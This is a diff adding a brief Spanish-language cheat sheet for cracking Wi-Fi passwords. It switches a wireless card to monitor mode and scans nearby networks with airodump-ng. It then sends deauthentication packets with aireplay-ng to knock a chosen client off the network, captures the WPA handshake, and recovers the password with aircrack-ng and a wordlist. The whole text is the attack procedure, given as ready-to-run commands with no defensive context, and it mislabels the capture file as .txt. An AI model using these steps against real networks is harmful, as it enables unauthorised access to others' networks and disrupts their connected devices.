@@ -1,1 +1,22 @@
+++ ifconfig wlan0 down
+
+++ iwconfig wlan0 mode monitor
+
+++ ifconfig wlan0 up
+
+++ airodump-ng wlan0 (Permite escuchar las conecciones cercanas)
+
+++ airodump-ng --bssid <ssid> --channel<num> --write kali wlan0 (Capturar handshake)
+
+++ Abrir otra terminal y ejecutar:
+--- aireplay-ng --deauth 20 -a <ssid> -c <mac_client_a_desconectar> wlan0 (Permite desconectar el dispositivo de la red para que este se vuelva a reconectar y
+asi poder capturar el handshake)
+--- En la terminal original nos aparecerá que el handshake ha sido capturado
+--- Crtl +C
+--- El handshake ha sido capturado en un archivo .txt
+
+++ aircrack-ng <handshake_file.cap> -w world.txt 
+--- Nos aparecerá la contraseña asociada a la red
+
+
 
